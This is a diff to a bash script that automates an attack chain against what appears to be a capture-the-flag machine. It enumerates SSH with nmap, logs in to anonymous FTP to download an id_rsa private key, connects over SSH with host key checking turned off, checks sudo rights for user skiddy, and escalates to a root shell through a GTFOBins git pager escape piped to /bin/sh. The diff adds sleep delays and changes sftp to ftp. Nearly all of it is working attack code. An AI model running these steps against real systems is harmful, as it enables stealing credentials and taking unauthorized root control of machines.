@@ -9,39 +9,39 @@ if ! nmap -p 22 --script ssh2-enum-algos "$ip_address"; then
   echo "Failed to perform basic enumeration."
   exit 1
 fi
-
+sleep 4
 # Connect to the machine as user Ashu and download id_rsa file
 echo "Connecting to $ip_address as user ftp and downloading id_rsa..."
-if ! sshpass -p "ftp" sftp ftp@"$ip_address" << EOF
-  get id_rsa
-  quit
+if ! ftp -n "$ip_address" << EOF
+user ftp
+get id_rsa
+quit
 EOF
 then
   echo "Failed to connect as user ftp or download id_rsa file."
   exit 1
 fi
-
+sleep 4
 # Change id_rsa permissions to 600
 echo "Changing id_rsa permissions to 600..."
 if ! chmod 600 id_rsa; then
   echo "Failed to change id_rsa permissions."
   exit 1
 fi
-
 # Connect to SSH using id_rsa
 echo "Connecting to $ip_address using id_rsa key..."
-if ! ssh -i id_rsa -o StrickHostKeyCHecking=no Ashu@"$ip_address"; then
+if ! ssh -i id_rsa -o StrictHostKeyChecking=no Ashu@"$ip_address"; then
   echo "Failed to connect using id_rsa key."
   exit 1
 fi
-
+sleep 4
 # Check sudo privileges for user skiddy
 echo "Checking sudo privileges for user skiddy..."
 if ! sudo -l -U skiddy; then
   echo "Failed to check sudo privileges for user skiddy."
   exit 1
 fi
-
+sleep 4
 # Elevate to user skiddy shell
 echo "Elevating to user skiddy shell..."
 if ! sudo su -c "echo 'Elevated to user skiddy shell.'" skiddy; then
@@ -55,12 +55,12 @@ if ! sudo -l | grep -i "git"; then
   echo "Failed to check sudo privileges for running git."
   exit 1
 fi
-
+sleep 4
 # Exploit GTFObins to obtain root shell
 echo "Exploiting GTFObins to gain root shell..."
 if ! sudo git -p help config | /bin/sh; then
   echo "Failed to exploit GTFObins to gain root shell."
   exit 1
 fi
-
+sleep 4
 echo "Script execution completed."
